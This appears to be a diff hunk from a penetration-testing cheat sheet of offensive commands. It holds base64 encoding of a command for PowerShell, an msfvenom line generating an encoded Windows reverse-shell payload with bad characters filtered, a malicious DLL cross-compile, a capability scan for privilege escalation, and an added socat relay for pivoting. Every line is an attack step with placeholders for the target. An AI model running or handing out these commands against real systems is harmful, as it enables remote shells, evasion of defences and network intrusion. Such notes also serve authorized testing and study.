@@ -34,3 +34,4 @@ echo -n COMMAND | iconv --to-code UTF-16LE | base64 -w 0
 msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT EXITFUNC=thread -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"
 x86_64-w64-mingw32-gcc SOURCE --shared -o DLL
 getcap -r / 2>/dev/null
+socat -ddd TCP-LISTEN:PORT,fork TCP:IP:PORT
